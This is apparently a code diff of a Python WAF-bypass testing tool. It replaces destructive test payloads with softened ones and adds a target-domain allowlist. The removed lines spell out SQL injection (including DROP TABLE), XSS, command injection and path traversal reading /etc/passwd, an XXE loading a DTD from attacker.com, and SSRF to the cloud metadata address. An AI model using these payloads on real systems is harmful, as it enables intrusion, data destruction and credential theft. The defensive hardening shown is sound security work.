@@ -31,43 +31,44 @@ class WAFBypassTester:
     """Web Application Firewall Bypass Tester"""
     
     def __init__(self):
+        # SAFE, non-destructive test payloads for security testing
         self.base_payloads = {
             "sql_injection": [
-                "' OR '1'='1",
-                "1; DROP TABLE users--",
-                "' UNION SELECT * FROM users--",
-                "admin'--",
-                "' OR 1=1#"
+                "' OR '1'='1",  # Basic boolean injection test
+                "1 UNION SELECT null",  # Structure test only
+                "admin'--",  # Comment injection test
+                "' OR 1=1--",  # Basic OR condition
+                "1' AND 1=1--"  # Basic AND condition
             ],
             "xss": [
-                "<script>alert('XSS')</script>",
-                "javascript:alert('XSS')",
-                "<img src=x onerror=alert('XSS')>",
-                "<svg onload=alert('XSS')>",
-                "';alert('XSS');//"
+                "<img src=x>",  # Basic HTML tag test
+                "javascript:void(0)",  # Safe JavaScript test
+                "<svg>test</svg>",  # SVG tag test
+                "'><script>void(0)</script>",  # Safe script test
+                "alert(String.fromCharCode(88,83,83))"  # Encoded alert test
             ],
             "command_injection": [
-                "; ls -la",
-                "| whoami",
-                "&& cat /etc/passwd",
-                "`id`",
-                "$(whoami)"
+                "; echo test",  # Safe echo command
+                "| echo test",  # Safe pipe test
+                "&& echo test",  # Safe AND test
+                "`echo test`",  # Safe backtick test
+                "$(echo test)"  # Safe subshell test
             ],
             "path_traversal": [
-                "../../../etc/passwd",
-                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-                "....//....//....//etc/passwd"
+                "../test.txt",  # Basic traversal test
+                "..\\test.txt",  # Windows traversal test
+                "%2e%2e%2ftest.txt",  # Encoded traversal test
+                "....//test.txt"  # Double-dot test
             ],
             "xxe": [
-                "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
-                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/evil.dtd'> %xxe;]>"
+                "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY test 'safe'>]><test>&test;</test>",
+                "<!DOCTYPE test [<!ENTITY % test SYSTEM 'http://safe.example.com/test.dtd'> %test;]>"
             ],
             "ssrf": [
-                "http://localhost:22",
-                "http://169.254.169.254/latest/meta-data/",
-                "file:///etc/passwd",
-                "gopher://localhost:80/"
+                "http://httpbin.org/get",  # Safe public test endpoint
+                "http://127.0.0.1:80",  # Safe localhost test
+                "http://169.254.169.254/",  # Metadata service test (safe check)
+                "file:///dev/null"  # Safe file test
             ]
         }
         
@@ -81,6 +82,12 @@ class WAFBypassTester:
             "modsecurity": ["mod_security", "modsec"]
         }
     
+        # Add target authorization validation
+        self.authorized_domains = [
+            "httpbin.org", "example.com", "safe.example.com",
+            "localhost", "127.0.0.1", "test.local"
+        ]
+
     def _encode_payload(self, payload: str, encoding: str) -> str:
         """Apply encoding to payload"""
         if encoding == "url_encoding":
@@ -335,11 +342,63 @@ class WAFBypassTester:
         
         return improvements
 
+    def _validate_target_authorization(self, url: str) -> bool:
+        """Validate that target URL is authorized for testing"""
+        from urllib.parse import urlparse
+        
+        try:
+            parsed = urlparse(url)
+            domain = parsed.netloc.lower()
+            
+            # Remove port if present
+            if ':' in domain:
+                domain = domain.split(':')[0]
+            
+            # Check against authorized domains
+            for authorized in self.authorized_domains:
+                if domain == authorized or domain.endswith(f".{authorized}"):
+                    return True
+            
+            # Additional checks for explicit testing consent
+            # Could check for special headers or domain patterns
+            if domain.endswith('.test') or domain.endswith('.local'):
+                return True
+                
+            return False
+            
+        except Exception:
+            return False
+
 async def execute_tool(request: WAFBypassRequest) -> WAFBypassResponse:
     """Execute WAF bypass testing"""
     start_time = time.time()
     
     tester = WAFBypassTester()
+    
+    # CRITICAL: Validate target authorization before testing
+    if not tester._validate_target_authorization(request.target_url):
+        return WAFBypassResponse(
+            target_url=request.target_url,
+            waf_detected=False,
+            waf_type=None,
+            waf_version=None,
+            total_payloads_tested=0,
+            successful_bypasses=0,
+            bypass_success_rate=0.0,
+            techniques_tested=[],
+            most_effective_technique=None,
+            payload_results=[],
+            blocked_patterns=[],
+            allowed_patterns=[],
+            filtering_rules=["UNAUTHORIZED TARGET - Testing blocked for security"],
+            risk_level="Critical",
+            vulnerability_summary="Target not authorized for security testing",
+            bypass_recommendations=["Only test against authorized targets"],
+            waf_improvement_suggestions=["Ensure proper authorization before testing"],
+            timestamp=datetime.now().isoformat(),
+            processing_time_ms=int((time.time() - start_time) * 1000)
+        )
+    
     payload_results = []
     
     # Test different combinations of payloads, encodings, and obfuscations
